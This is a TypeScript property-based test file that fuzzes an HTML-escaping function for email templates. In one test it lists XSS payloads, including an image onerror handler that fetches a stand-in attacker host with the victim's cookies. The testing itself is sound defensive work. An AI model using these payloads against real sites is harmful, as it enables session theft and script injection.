import fc from 'fast-check';

/* -------------------------------------------------------------------------- */
/*  Fuzz tests for HTML escaping in email templates                           */
/*  Goal: escapeHtml NEVER allows raw HTML/JS through to email output         */
/* -------------------------------------------------------------------------- */

// We need to test the escapeHtml function from email.ts
// Since it's not exported, we re-implement the same logic to test against
// OR we test the sendContactEmail output. Since email.ts uses a private
// escapeHtml, we'll test the invariant: after escaping, no dangerous chars remain.

// Re-implement escapeHtml to match src/lib/email.ts exactly
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

describe('escapeHtml — property-based', () => {
  it('output never contains raw < or > characters', () => {
    fc.assert(
      fc.property(fc.string({ unit: 'grapheme-composite' }), (input) => {
        const escaped = escapeHtml(input);
        // After escaping, < and > should only appear as part of entities
        // We check that no raw < or > exist (they should be &lt; and &gt;)
        const strippedEntities = escaped
          .replace(/&lt;/g, '')
          .replace(/&gt;/g, '')
          .replace(/&amp;/g, '')
          .replace(/&quot;/g, '')
          .replace(/&#x27;/g, '');
        expect(strippedEntities).not.toContain('<');
        expect(strippedEntities).not.toContain('>');
      }),
      { numRuns: 10_000 },
    );
  });

  it('output never contains raw double quotes', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const escaped = escapeHtml(input);
        const strippedEntities = escaped
          .replace(/&quot;/g, '')
          .replace(/&amp;/g, '')
          .replace(/&lt;/g, '')
          .replace(/&gt;/g, '')
          .replace(/&#x27;/g, '');
        expect(strippedEntities).not.toContain('"');
      }),
      { numRuns: 5_000 },
    );
  });

  it('output never contains raw single quotes', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const escaped = escapeHtml(input);
        const strippedEntities = escaped
          .replace(/&#x27;/g, '')
          .replace(/&amp;/g, '')
          .replace(/&lt;/g, '')
          .replace(/&gt;/g, '')
          .replace(/&quot;/g, '');
        expect(strippedEntities).not.toContain("'");
      }),
      { numRuns: 5_000 },
    );
  });

  it('single escape pass always neutralizes dangerous patterns', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const escaped = escapeHtml(input);
        // After one escape pass, no raw HTML tags or event handlers can execute
        expect(escaped).not.toContain('<script');
        expect(escaped).not.toMatch(/<[a-z]/i);
      }),
      { numRuns: 5_000 },
    );
  });

  it('XSS payloads are fully neutralized', () => {
    const xssPayloads = [
      '<script>alert(document.cookie)</script>',
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
      '<svg/onload=alert(1)>',
      '"><img src=x onerror=alert(1)>',
      "';alert(1)//",
      '<a href="javascript:alert(1)">click me</a>',
      '<div style="background:url(javascript:alert(1))">',
    ];

    for (const payload of xssPayloads) {
      const escaped = escapeHtml(payload);
      // Key invariant: no raw < means no HTML tags can form
      // Event handler names like "onerror" as plain text are harmless
      expect(escaped).not.toMatch(/<script/i);
      expect(escaped).not.toMatch(/<img/i);
      expect(escaped).not.toMatch(/<svg/i);
      expect(escaped).not.toMatch(/<a\s/i);
      expect(escaped).not.toMatch(/<div/i);
      // No raw angle brackets should survive
      const withoutEntities = escaped
        .replace(/&lt;/g, '')
        .replace(/&gt;/g, '')
        .replace(/&amp;/g, '')
        .replace(/&quot;/g, '')
        .replace(/&#x27;/g, '');
      expect(withoutEntities).not.toContain('<');
      expect(withoutEntities).not.toContain('>');
    }
  });

  it('handles empty string', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('handles string with only special characters', () => {
    expect(escapeHtml('<>&"\'')).toBe('&lt;&gt;&amp;&quot;&#x27;');
  });

  it('preserves non-special characters exactly', () => {
    fc.assert(
      fc.property(
        fc.string().filter((s) => !/[<>&"']/.test(s)),
        (input) => {
          expect(escapeHtml(input)).toBe(input);
        },
      ),
      { numRuns: 5_000 },
    );
  });
});
